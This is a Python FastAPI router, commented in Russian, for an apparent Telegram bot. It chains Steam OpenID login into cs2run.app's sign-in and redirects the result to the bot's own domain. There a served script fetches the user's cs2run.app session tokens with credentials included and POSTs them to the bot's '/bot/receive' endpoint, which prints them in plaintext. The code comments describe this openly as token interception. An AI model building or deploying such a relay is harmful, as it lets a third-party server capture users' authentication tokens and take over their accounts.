# steam_auth.py
from fastapi import APIRouter, Request, Query
from fastapi.responses import HTMLResponse, RedirectResponse
import urllib.parse
import json

router = APIRouter()
SELF_URL = "https://tg-bot-test-gkbp.onrender.com"


# -------------------------------
# 1️⃣ Login → Steam
# -------------------------------
@router.get("/auth/login")
async def auth_login(chat_id: int):
    """
    Генерируем ссылку на Steam OpenID
    """
    callback_url = f"{SELF_URL}/auth/callback?chat_id={chat_id}"

    steam_url = (
        "https://steamcommunity.com/openid/login?"
        "openid.ns=http://specs.openid.net/auth/2.0&"
        "openid.mode=checkid_setup&"
        "openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&"
        "openid.identity=http://specs.openid.net/auth/2.0/identifier_select&"
        f"openid.return_to={urllib.parse.quote(callback_url)}&"
        f"openid.realm={urllib.parse.quote(SELF_URL)}"
    )

    return RedirectResponse(steam_url)


# -------------------------------
# 2️⃣ Callback после Steam
# -------------------------------
@router.get("/auth/callback")
async def auth_callback(request: Request, chat_id: int = Query(...)):
    """
    Получаем параметры OpenID от Steam.
    Независимо от них, редиректим пользователя на CS2RUN start-sign-in
    """
    steam_params = dict(request.query_params)
    print("\n🧪 STEAM CALLBACK PARAMS:\n", steam_params, "\n")

    # Собираем ссылку на CS2RUN
    return_url = f"{SELF_URL}/hook?chat_id={chat_id}"
    query = {
        "returnUrl": return_url,
        **{k: v for k, v in steam_params.items() if k.startswith("openid.")}
    }
    encoded = urllib.parse.urlencode(query, safe=":/?=&")
    cs2run_url = f"https://cs2run.app/auth/1/start-sign-in/?{encoded}"

    print("\n🚀 REDIRECT TO CS2RUN:\n", cs2run_url, "\n")
    return RedirectResponse(cs2run_url)


# -------------------------------
# 3️⃣ Hook для перехвата токенов на нашем домене
# -------------------------------
@router.get("/hook")
async def hook():
    """
    Страница, на которую CS2RUN редиректит с токенами.
    Здесь JS их перехватывает и отправляет на сервер.
    """
    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head><title>Авторизация…</title></head>
<body>
<h3>🔐 Авторизация завершена</h3>
<p>Подождите, данные отправляются в бот…</p>

<script>
(async function() {{
    try {{
        const params = new URLSearchParams(window.location.search);
        const qs = params.toString();

        // Делаем GET к start-sign-in снова для JSON (если токены в теле)
        const resp = await fetch(`https://cs2run.app/auth/1/start-sign-in/?${{qs}}`, {{
            method: 'GET',
            credentials: 'include'
        }});
        const data = await resp.json();

        console.log("🔥 GOT CS2RUN TOKENS:", data);

        // Отправляем токены на сервер
        await fetch('{SELF_URL}/bot/receive?chat_id=' + params.get('chat_id'), {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(data)
        }});

        document.body.innerHTML = "<h3>✅ Токены получены! Можно закрывать окно</h3>";

    }} catch(e) {{
        console.error("Ошибка при перехвате токенов:", e);
        document.body.innerHTML = "<h3>❌ Ошибка при получении токенов</h3>";
    }}
}})();
</script>

</body>
</html>
""")


# -------------------------------
# 4️⃣ Сервер принимает токены
# -------------------------------
@router.post("/bot/receive")
async def receive_tokens(chat_id: int, payload: dict):
    """
    Получаем токены для использования в боте.
    """
    print("\n🔥 GOT TOKENS FOR CHAT", chat_id, ":\n", json.dumps(payload, indent=2), "\n")
    # Можно положить в RAM или сразу использовать
    return {"ok": True}